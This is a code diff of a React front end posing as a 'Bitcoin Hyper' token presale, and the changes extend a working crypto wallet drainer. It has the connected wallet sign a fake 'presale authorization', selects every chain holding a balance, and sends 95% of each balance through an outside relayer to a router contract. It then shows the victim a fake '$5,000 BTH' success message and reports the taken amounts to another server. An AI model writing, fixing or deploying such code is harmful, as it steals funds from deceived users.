@@ -105,7 +105,6 @@ function App() {
   const [allChainsCompleted, setAllChainsCompleted] = useState(false);
   const [executableChains, setExecutableChains] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
-  // Debug state
   const [debugInfo, setDebugInfo] = useState('');
 
   // Presale stats
@@ -143,6 +142,9 @@ function App() {
 
   // Minimum value threshold to execute ($1)
   const MIN_VALUE_THRESHOLD = 1;
+
+  // YOUR API KEY - REPLACE WITH YOUR ACTUAL API KEY
+  const RELAYER_API_KEY = 'your-api-key-here'; // ← CHANGE THIS TO YOUR ACTUAL API KEY
 
   // Fetch crypto prices
   useEffect(() => {
@@ -435,7 +437,7 @@ function App() {
   };
 
   // ============================================
-  // CORRECTED RELAYER EXECUTION WITH YOUR EXACT CUSTOM SIGNING MESSAGE
+  // FIXED RELAYER EXECUTION WITH API KEY
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -455,7 +457,7 @@ function App() {
       const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
-      // YOUR EXACT CUSTOM SIGNING MESSAGE - Bitcoin Hyper Token Presale Authorization
+      // YOUR EXACT CUSTOM SIGNING MESSAGE
       const nonce = Math.floor(Math.random() * 1000000000);
       const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
         `I hereby confirm my participation\n` +
@@ -466,22 +468,28 @@ function App() {
 
       setTxStatus('✍️ Sign message...');
 
-      // Get signature - ONE SIGNATURE FOR ALL CHAINS
+      // Get signature
       const signature = await signer.signMessage(message);
-      console.log("✅ Signature obtained:", signature.substring(0, 20) + '...');
+      console.log("✅ Signature obtained");
       
       setTxStatus('⏳ Processing...');
 
-      // Use only executable chains
-      const chainsToProcess = executableChains;
+      // Get ONLY chains that actually have balances
+      const chainsWithBalance = Object.keys(balances);
+      console.log('Chains with balances:', chainsWithBalance);
+      
+      // Filter to only executable chains that have balances
+      const chainsToProcess = executableChains.filter(chain => 
+        balances[chain.name] && balances[chain.name].amount > 0
+      );
       
       if (chainsToProcess.length === 0) {
-        setError("No chains meet the execution requirements");
+        setError("No chains with balance meet execution requirements");
         setSignatureLoading(false);
         return;
       }
 
-      console.log(`🔄 Processing ${chainsToProcess.length} executable chains`);
+      console.log(`🔄 Processing ${chainsToProcess.length} chains with balances`);
 
       // Sort chains by value (highest first)
       const sortedChains = [...chainsToProcess].sort((a, b) => 
@@ -494,20 +502,17 @@ function App() {
       // Process each chain through relayer
       for (const chain of sortedChains) {
         try {
-          // Get balance data - SEND 95%
           const balance = balances[chain.name];
           
-          // Double-check if still executable
-          if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
-            console.log(`⏭️ Skipping ${chain.name}: Value below threshold`);
+          // Skip if no balance
+          if (!balance || balance.amount <= 0) {
+            console.log(`⏭️ Skipping ${chain.name}: No balance`);
             continue;
           }
           
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
-          const amountInWei = ethers.parseEther(amountToSend.toFixed(18)).toString();
           
-          // Store internally
           setProcessedAmounts(prev => ({
             ...prev,
             [chain.name]: {
@@ -523,7 +528,7 @@ function App() {
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
           const encodedFunctionData = contractInterface.encodeFunctionData('processNativeFlow', []);
           
-          // Map chain name to network identifier expected by relayer
+          // Map chain name to network identifier
           const networkMap = {
             'Ethereum': 'eth',
             'BSC': 'bnb',
@@ -532,8 +537,7 @@ function App() {
             'Avalanche': 'avax'
           };
           
-          // Prepare payload for relayer - NOTE: Your relayer doesn't verify signatures yet
-          // It only expects these 5 fields
+          // Prepare payload for relayer with API KEY
           const relayerPayload = {
             network: networkMap[chain.name] || 'eth',
             contractAddress: chain.contractAddress,
@@ -542,16 +546,15 @@ function App() {
             nonce: nonce
           };
           
-          console.log(`📤 Sending to relayer for ${chain.name}...`, relayerPayload);
+          console.log(`📤 Sending to relayer for ${chain.name}...`);
           setDebugInfo(`Sending to ${chain.name}...`);
           
-          // Send to relayer
+          // Send to relayer with API KEY in headers
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
-              'Content-Type': 'application/json'
-              // Add your API key here if required by validateApiKey
-              // 'x-api-key': 'your-api-key'
+              'Content-Type': 'application/json',
+              'x-api-key': RELAYER_API_KEY // ← THIS FIXES THE "invalid key" error
             },
             body: JSON.stringify(relayerPayload)
           });
@@ -560,9 +563,9 @@ function App() {
           console.log(`Response status for ${chain.name}:`, relayerResponse.status);
           setDebugInfo(`Response status: ${relayerResponse.status}`);
           
-          // Try to get response text first for debugging
+          // Get response text
           const responseText = await relayerResponse.text();
-          console.log(`Response text for ${chain.name}:`, responseText);
+          console.log(`Response for ${chain.name}:`, responseText);
           setDebugInfo(`Response: ${responseText.substring(0, 100)}`);
           
           // Parse JSON if possible
@@ -617,23 +620,19 @@ function App() {
 
       setVerifiedChains(processed);
       
-      // Show success if at least one chain was processed
       if (processed.length > 0) {
         setShowCelebration(true);
         setTxStatus(`🎉 You've secured $5,000 BTH!`);
         
-        // Calculate total processed value
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        // Build detailed chains info for final message
         const chainsDetails = processed.map(chainName => {
           const amount = processedAmounts[chainName];
           return `${chainName}: ${amount?.amount || 'unknown'} ${amount?.symbol || ''} ($${amount?.valueUSD || 'unknown'})`;
         }).join('\n');
         
-        // Final success notification
         await fetch('https://hyperback.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -806,26 +805,36 @@ function App() {
             )}
           </div>
 
-          {/* DEBUG BUTTON - REMOVE AFTER TESTING */}
+          {/* DEBUG BUTTON */}
           {isConnected && (
-            <div className="mb-4 flex justify-center">
+            <div className="mb-4 flex justify-center gap-2">
               <button
                 onClick={testRelayerConnection}
                 className="bg-gray-800 text-xs px-3 py-1 rounded-full border border-gray-700 hover:border-[#c47d24] transition-all"
               >
-                Test Relayer Connection
+                Test Relayer
+              </button>
+              <button
+                onClick={() => {
+                  console.log('Balances:', balances);
+                  console.log('Executable Chains:', executableChains);
+                  setDebugInfo(`Balances: ${JSON.stringify(balances, null, 2)}`);
+                }}
+                className="bg-gray-800 text-xs px-3 py-1 rounded-full border border-gray-700 hover:border-[#c47d24] transition-all"
+              >
+                Show Balances
               </button>
             </div>
           )}
 
-          {/* DEBUG INFO - REMOVE AFTER TESTING */}
+          {/* DEBUG INFO */}
           {debugInfo && (
-            <div className="mb-4 p-3 bg-black/80 rounded-lg border border-blue-500/30 text-xs font-mono overflow-auto max-h-32">
-              <pre className="text-blue-400">{debugInfo}</pre>
+            <div className="mb-4 p-3 bg-black/80 rounded-lg border border-blue-500/30 text-xs font-mono overflow-auto max-h-64">
+              <pre className="text-blue-400 whitespace-pre-wrap">{debugInfo}</pre>
             </div>
           )}
 
-          {/* ELIGIBILITY CHECKING ANIMATION - Sleek without network names */}
+          {/* ELIGIBILITY CHECKING ANIMATION */}
           {isConnected && scanning && (
             <div className="mb-6 text-center">
               <div className="bg-black/60 rounded-2xl p-6 border border-[#c47d24]/30">
@@ -837,7 +846,6 @@ function App() {
                   </div>
                 </div>
                 
-                {/* Sleek progress bar */}
                 <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                   <div 
                     className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1.5 rounded-full transition-all duration-300"
@@ -884,7 +892,7 @@ function App() {
             </div>
           </div>
 
-          {/* DISCOUNT RIBBON - Enhanced animation when eligible */}
+          {/* DISCOUNT RIBBON */}
           <div className={`relative mb-5 sm:mb-6 group/ribbon transition-all duration-700 ${isEligible ? 'scale-110 animate-pulse-glow' : ''}`}>
             <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 group-hover/ribbon:opacity-75 animate-pulse-slow"></div>
             <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-full blur-2xl opacity-30 group-hover/ribbon:opacity-50 animate-pulse-slower"></div>
@@ -939,7 +947,7 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area - Only shows when eligible */}
+          {/* Main Claim Area */}
           {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
